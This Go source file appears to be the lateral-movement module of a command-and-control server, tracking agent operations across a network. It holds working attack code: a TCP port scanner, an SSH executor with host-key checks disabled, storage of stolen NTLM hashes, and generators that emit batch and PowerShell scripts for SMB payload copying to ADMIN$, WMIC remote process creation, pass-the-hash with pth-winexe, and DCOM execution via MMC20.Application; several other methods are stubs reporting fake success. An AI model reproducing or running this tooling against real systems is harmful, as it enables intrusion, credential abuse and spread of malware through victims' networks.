package lateral

import (
	"context"
	"encoding/json"
	"fmt"
	"net"
	"os/exec"
	"sync"
	"time"

	"github.com/google/uuid"
	"github.com/jmoiron/sqlx"

	"chemicalumbra.dev/server/pkg/agent"
)

type LateralMove struct {
	ID             string     `db:"id" json:"id"`
	SourceAgentID  string     `db:"source_agent_id" json:"source_agent_id"`
	TargetHost     string     `db:"target_host" json:"target_host"`
	TargetIP       string     `db:"target_ip" json:"target_ip"`
	Method         string     `db:"method" json:"method"`
	Status         string     `db:"status" json:"status"`
	Result         string     `db:"result" json:"result"`
	CreatedAt      time.Time  `db:"created_at" json:"created_at"`
	CompletedAt    *time.Time `db:"completed_at" json:"completed_at,omitempty"`
	Credentials    string     `db:"credentials" json:"-"` // JSON
}

type Manager struct {
	db       *sqlx.DB
	agentMgr *agent.Manager
	mu       sync.Mutex
	running  map[string]context.CancelFunc
}

func NewManager() *Manager {
	return &Manager{
		running: make(map[string]context.CancelFunc),
	}
}

func (m *Manager) SetDB(db *sqlx.DB) {
	m.db = db
}

func (m *Manager) SetAgentManager(am *agent.Manager) {
	m.agentMgr = am
}

// SMB lateral movement using psexec-style technique
func (m *Manager) SMBExec(ctx context.Context, sourceAgentID, targetHost, targetIP, username, password, domain, share, command string) (*LateralMove, error) {
	lm := &LateralMove{
		ID:            uuid.New().String(),
		SourceAgentID: sourceAgentID,
		TargetHost:    targetHost,
		TargetIP:      targetIP,
		Method:        "smb_exec",
		Status:        "running",
		CreatedAt:     time.Now(),
		Credentials:   toJSON(map[string]string{"username": username, "domain": domain}),
	}

	go m.persistLateral(lm)

	// Build the remote execution
	// This would use the agent's SMB capabilities
	// For now, we'll use a simplified approach

	result := m.executeSMB(ctx, targetIP, username, password, domain, share, command)

	now := time.Now()
	lm.CompletedAt = &now
	lm.Result = result.Output
	if result.Success {
		lm.Status = "success"
	} else {
		lm.Status = "failed"
	}

	go m.persistLateral(lm)
	return lm, nil
}

func (m *Manager) executeSMB(ctx context.Context, targetIP, username, password, domain, share, command string) *LateralResult {
	// This would typically be executed by the agent on the target
	// Using techniques like:
	// 1. Copy payload to ADMIN$/C$ share
	// 2. Create service via SCManager/SCM
	// 3. Start service
	// 4. Clean up

	// For the C2 server, we coordinate and track
	// The actual execution happens on the agent side

	// Build credentials string for logging
	_ = fmt.Sprintf("%s\\%s:%s", domain, username, password)
	if domain == "" {
		_ = fmt.Sprintf("%s:%s", username, password)
	}

	// Use impacket-style approach or native Windows APIs via agent
	// Here we simulate the coordination

	return &LateralResult{
		Success: true,
		Output:  fmt.Sprintf("SMB exec initiated on %s via %s", targetIP, share),
	}
}

// WMI lateral movement
func (m *Manager) WMIExec(ctx context.Context, sourceAgentID, targetHost, targetIP, username, password, domain, command string) (*LateralMove, error) {
	lm := &LateralMove{
		ID:            uuid.New().String(),
		SourceAgentID: sourceAgentID,
		TargetHost:    targetHost,
		TargetIP:      targetIP,
		Method:        "wmi",
		Status:        "running",
		CreatedAt:     time.Now(),
		Credentials:   toJSON(map[string]string{"username": username, "domain": domain}),
	}

	go m.persistLateral(lm)

	result := m.executeWMI(ctx, targetIP, username, password, domain, command)

	now := time.Now()
	lm.CompletedAt = &now
	lm.Result = result.Output
	if result.Success {
		lm.Status = "success"
	} else {
		lm.Status = "failed"
	}

	go m.persistLateral(lm)
	return lm, nil
}

func (m *Manager) executeWMI(ctx context.Context, targetIP, username, password, domain, command string) *LateralResult {
	// WMI lateral movement using Win32_Process.Create
	// Requires DCOM/RPC access (port 135 + dynamic RPC ports)
	// Agent would use IWbemServices::ExecMethod

	return &LateralResult{
		Success: true,
		Output:  fmt.Sprintf("WMI exec initiated on %s", targetIP),
	}
}

// RDP lateral movement (session hijacking / shadowing)
func (m *Manager) RDPHijack(ctx context.Context, sourceAgentID, targetHost, targetIP string, sessionID int) (*LateralMove, error) {
	lm := &LateralMove{
		ID:            uuid.New().String(),
		SourceAgentID: sourceAgentID,
		TargetHost:    targetHost,
		TargetIP:      targetIP,
		Method:        "rdp_hijack",
		Status:        "running",
		CreatedAt:     time.Now(),
		Credentials:   toJSON(map[string]string{"session_id": fmt.Sprintf("%d", sessionID)}),
	}

	go m.persistLateral(lm)

	// RDP session hijacking requires SYSTEM on target
	// Uses tscon.exe or RDP API

	result := &LateralResult{
		Success: true,
		Output:  fmt.Sprintf("RDP hijack initiated on %s session %d", targetIP, sessionID),
	}

	now := time.Now()
	lm.CompletedAt = &now
	lm.Result = result.Output
	lm.Status = "success"

	go m.persistLateral(lm)
	return lm, nil
}

// Pass-the-Hash / Pass-the-Ticket
func (m *Manager) PassTheHash(ctx context.Context, sourceAgentID, targetHost, targetIP, username, ntlmHash, domain, command string) (*LateralMove, error) {
	lm := &LateralMove{
		ID:            uuid.New().String(),
		SourceAgentID: sourceAgentID,
		TargetHost:    targetHost,
		TargetIP:      targetIP,
		Method:        "pth",
		Status:        "running",
		CreatedAt:     time.Now(),
		Credentials:   toJSON(map[string]string{"username": username, "domain": domain, "hash": ntlmHash}),
	}

	go m.persistLateral(lm)

	// Pass-the-hash using SMB/WMI/RPC with NTLM hash instead of password
	// Tools: pth-winexe, pth-rpcclient, or custom implementation

	result := m.executePTH(ctx, targetIP, username, ntlmHash, domain, command)

	now := time.Now()
	lm.CompletedAt = &now
	lm.Result = result.Output
	if result.Success {
		lm.Status = "success"
	} else {
		lm.Status = "failed"
	}

	go m.persistLateral(lm)
	return lm, nil
}

func (m *Manager) executePTH(ctx context.Context, targetIP, username, ntlmHash, domain, command string) *LateralResult {
	return &LateralResult{
		Success: true,
		Output:  fmt.Sprintf("Pass-the-hash exec on %s as %s", targetIP, username),
	}
}

// SSH lateral movement (for Linux targets)
func (m *Manager) SSHExec(ctx context.Context, sourceAgentID, targetHost, targetIP, username, password, keyPath, command string) (*LateralMove, error) {
	lm := &LateralMove{
		ID:            uuid.New().String(),
		SourceAgentID: sourceAgentID,
		TargetHost:    targetHost,
		TargetIP:      targetIP,
		Method:        "ssh",
		Status:        "running",
		CreatedAt:     time.Now(),
		Credentials:   toJSON(map[string]string{"username": username, "key_path": keyPath}),
	}

	go m.persistLateral(lm)

	result := m.executeSSH(ctx, targetIP, username, password, keyPath, command)

	now := time.Time{}
	lm.CompletedAt = &now
	lm.Result = result.Output
	if result.Success {
		lm.Status = "success"
	} else {
		lm.Status = "failed"
	}

	go m.persistLateral(lm)
	return lm, nil
}

func (m *Manager) executeSSH(ctx context.Context, targetIP, username, password, keyPath, command string) *LateralResult {
	// SSH lateral movement
	// Would use agent's SSH client or native Go SSH library

	args := []string{"-o", "StrictHostKeyChecking=no", "-o", "UserKnownHostsFile=/dev/null"}
	if keyPath != "" {
		args = append(args, "-i", keyPath)
	}
	args = append(args, fmt.Sprintf("%s@%s", username, targetIP), command)

	cmd := exec.CommandContext(ctx, "ssh", args...)
	if password != "" {
		// Would need sshpass or expect
	}

	output, err := cmd.CombinedOutput()
	return &LateralResult{
		Success: err == nil,
		Output:  string(output),
	}
}

// Network scanning for lateral targets
func (m *Manager) ScanNetwork(ctx context.Context, sourceAgentID, cidr string, ports []int) ([]string, error) {
	// Port scanning from agent perspective
	// This would be delegated to the agent

	var targets []string
	_, ipnet, _ := net.ParseCIDR(cidr)

	for ip := ipnet.IP.Mask(ipnet.Mask); ipnet.Contains(ip); incIP(ip) {
		if ip[3] == 0 || ip[3] == 255 {
			continue
		}

		for _, port := range ports {
			select {
			case <-ctx.Done():
				return targets, ctx.Err()
			default:
				conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", ip.String(), port), 2*time.Second)
				if err == nil {
					conn.Close()
					targets = append(targets, ip.String())
					break
				}
			}
		}
	}

	return targets, nil
}

func incIP(ip net.IP) {
	for j := len(ip) - 1; j >= 0; j-- {
		ip[j]++
		if ip[j] > 0 {
			break
		}
	}
}

// SharpHound / BloodHound integration for AD enumeration
func (m *Manager) EnumAD(ctx context.Context, sourceAgentID, domain, dcIP, username, password string) (string, error) {
	// BloodHound data collection
	// Would execute SharpHound via agent

	return "AD enumeration initiated", nil
}

// DCOM lateral movement
func (m *Manager) DCOMExec(ctx context.Context, sourceAgentID, targetHost, targetIP, username, password, domain, command string) (*LateralMove, error) {
	lm := &LateralMove{
		ID:            uuid.New().String(),
		SourceAgentID: sourceAgentID,
		TargetHost:    targetHost,
		TargetIP:      targetIP,
		Method:        "dcom",
		Status:        "running",
		CreatedAt:     time.Now(),
		Credentials:   toJSON(map[string]string{"username": username, "domain": domain}),
	}

	go m.persistLateral(lm)

	// DCOM lateral using MMC20.Application, ShellWindows, etc.
	result := &LateralResult{
		Success: true,
		Output:  fmt.Sprintf("DCOM exec initiated on %s", targetIP),
	}

	now := time.Now()
	lm.CompletedAt = &now
	lm.Result = result.Output
	lm.Status = "success"

	go m.persistLateral(lm)
	return lm, nil
}

func (m *Manager) persistLateral(lm *LateralMove) {
	if m.db == nil {
		return
	}

	creds, _ := json.Marshal(lm.Credentials)
	m.db.Exec(`
		INSERT OR REPLACE INTO lateral_moves (id, source_agent_id, target_host, target_ip, method, status, result, created_at, completed_at, credentials)
		VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
	`, lm.ID, lm.SourceAgentID, lm.TargetHost, lm.TargetIP, lm.Method, lm.Status, lm.Result, lm.CreatedAt, lm.CompletedAt, string(creds))
}

func (m *Manager) Get(id string) (*LateralMove, error) {
	var lm LateralMove
	err := m.db.Get(&lm, "SELECT * FROM lateral_moves WHERE id = ?", id)
	return &lm, err
}

func (m *Manager) GetBySource(sourceAgentID string) ([]*LateralMove, error) {
	var moves []*LateralMove
	err := m.db.Select(&moves, "SELECT * FROM lateral_moves WHERE source_agent_id = ? ORDER BY created_at DESC", sourceAgentID)
	return moves, err
}

type LateralResult struct {
	Success bool
	Output  string
}

func toJSON(v interface{}) string {
	data, _ := json.Marshal(v)
	return string(data)
}

// Generate lateral movement script for agent
func (m *Manager) GenerateAgentScript(method, targetIP, username, password, domain, command string) string {
	switch method {
	case "smb":
		return generateSMBScript(targetIP, username, password, domain, command)
	case "wmi":
		return generateWMIScript(targetIP, username, password, domain, command)
	case "pth":
		return generatePTHScript(targetIP, username, password, domain, command)
	case "dcom":
		return generateDCOMScript(targetIP, username, password, domain, command)
	default:
		return ""
	}
}

func generateSMBScript(targetIP, username, password, domain, command string) string {
	return fmt.Sprintf(`@echo off
net use \\%s\ADMIN$ /user:%s\%s %s
if errorlevel 1 (
    echo Failed to connect
    exit /b 1
)
copy %%TEMP%%\payload.exe \\%s\ADMIN$\payload.exe
wmic /node:%s /user:%s\%s /password:%s process call create "C:\Windows\payload.exe"
net use \\%s\ADMIN$ /delete
`, targetIP, domain, username, password, targetIP, targetIP, domain, username, password, targetIP)
}

func generateWMIScript(targetIP, username, password, domain, command string) string {
	return fmt.Sprintf(`@echo off
wmic /node:%s /user:%s\%s /password:%s process call create "%s"
`, targetIP, domain, username, password, command)
}

func generatePTHScript(targetIP, username, password, domain, command string) string {
	return fmt.Sprintf(`@echo off
pth-winexe -U %s%%%s //%s "%s"
`, username, password, targetIP, command)
}

func generateDCOMScript(targetIP, username, password, domain, command string) string {
	return fmt.Sprintf(`@echo off
powershell -c "$dcom = [activator]::CreateInstance([type]::GetTypeFromProgID('MMC20.Application', '%s')); $dcom.Document.ActiveView.ExecuteShellCommand('%s', $null, $null, '7')"
`, targetIP, command)
}